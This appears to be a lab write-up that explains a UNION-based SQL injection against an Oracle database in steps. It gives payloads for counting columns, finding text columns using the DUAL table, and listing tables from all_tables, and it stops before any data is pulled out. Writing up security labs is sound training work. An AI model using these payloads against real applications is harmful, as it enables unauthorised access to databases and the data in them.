## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/234487924-92fe230b-d01c-4d88-8f40-ece849a2d2e2.png)

## Solution :


> NOTE -  On Oracle databases, every `SELECT` statement must **specify a table to select FROM**. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
>
>There is a built-in table on Oracle called **dual** which you can use for this purpose. 
>
> For example: `UNION SELECT 'abc' FROM dual`

#### Determine number of columns -

Order by 3 throws a error which means there are 2 columns.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

![image](https://user-images.githubusercontent.com/67383098/234492107-acad89e0-9e01-4c0e-aab3-17c4f3ab8c0b.png)

#### Determine column with text data

Here we use the `DUAL` table which is by defaut present in ORACLE databse

Both columns have text data

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'abc','def' FROM DUAL--
```

![image](https://user-images.githubusercontent.com/67383098/234493878-4160908e-fddd-4269-a091-395850b55e44.png)

#### Retreive data from ORACLE db -


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT table_name,NULL FROM all_tables--
```

We get a list of all the tables,

The table which we are interested in is this 





